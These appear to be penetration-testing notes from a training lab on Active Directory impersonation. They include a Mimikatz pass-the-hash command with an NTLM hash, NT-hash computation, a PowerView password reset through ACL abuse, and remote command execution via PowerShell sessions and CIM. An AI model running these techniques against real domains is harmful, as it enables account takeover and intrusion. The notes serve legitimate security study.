### Impersonate the user (PowerShell context)
PowerShell itself does **not magically impersonate** unless you **start it with other credentials** or explicitly use credentials.

#### Correct & reliable way (new PowerShell session)
```powershell
runas /netonly /user:DOMAIN\<USER> powershell.exe
```
<img width="1614" height="77" alt="Pasted image 20260102085641" src="https://github.com/user-attachments/assets/8dfe54bb-eead-4e7f-bd71-d0ad09797e9f" />
- Opens a **new PowerShell window**
### overpass-the-hash of Jose's NTLM hash to forge a valid TGT Kerberos ticket:
#### we can get any password `NT_HASH` by following
```shell
python
>>> import hashlib
>>> hashlib.new('md4', '<PASSWORD>'.encode('utf-16le')).digest().hex()
```
From Mimikatz
```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:jose /ntlm:fa61a89e878f8688afb10b515a4866c7 /domain:inlanefreight.local /run:powershell.exe" exit
```

## Authenticate as the Controlling User User I have  
   - **Create a Secure String** for the password of the user with ACL permissions (e.g., `ali`):  
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```  
   - **Create a PSCredential Object** to impersonate the controlling user:  
```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
```  
Replace `DOMAIN\USERNAME` (e.g., `corp.com\ali`).

#### Example use the impersonate user to change a user password
**Define the New Password for the Target User**  
   - **Create a Secure String** for the new password (e.g., `Newpassword1`):  
```powershell
$NewPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
```  

**Reset the Target User's Password**  
   - **Import Required Modules** (e.g., PowerView):  
```powershell
Import-Module .\PowerView.ps1
```  
   - **Execute the Password Change (Must be admin shell)**:  
```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPassword -Credential $Cred -Verbose
```

---
## Using Credentials

#### **Option 1: Create a New Session**
1. Start a new session:
   ```powershell
   $session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
   ```

2. Enter the session:
   ```powershell
   Enter-PSSession -Session $session
   ```

3. Run commands remotely:
   ```powershell
   Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
   ```

#### **Option 2: Run Commands via CIM**
1. Build the command:
   ```powershell
   $Command = 'whoami'
   Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}
   ```


